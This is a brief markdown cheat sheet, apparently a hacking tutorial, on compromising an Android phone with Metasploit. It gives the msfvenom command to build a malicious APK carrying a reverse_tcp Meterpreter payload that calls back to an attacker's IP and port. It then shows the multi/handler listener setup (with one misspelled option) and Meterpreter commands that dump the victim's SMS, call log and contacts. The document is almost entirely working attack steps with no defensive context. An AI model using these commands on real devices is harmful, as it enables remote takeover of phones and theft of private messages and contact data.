# Hacking an Android Phone

## Creating the payload

```sh
msfvenom -p android/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] >/root/Desktop/payload_name.apk
```

## Metasploit

```sh
msfconsole
use exploits/multi/handler
set lhost [IP]
set lport [PORT]
set paylaod android/meterpreter/reverse_tcp
exploit
```

## The Meterpreter commands

```sh
check root # this command line will let you know if the target's device is rooted
dump_sms # this command line is for extracting sms from the phone
dump_calllog # to extract the log of incoming and outgoing calls
dump_contacts # retrieve the target's contacts
```

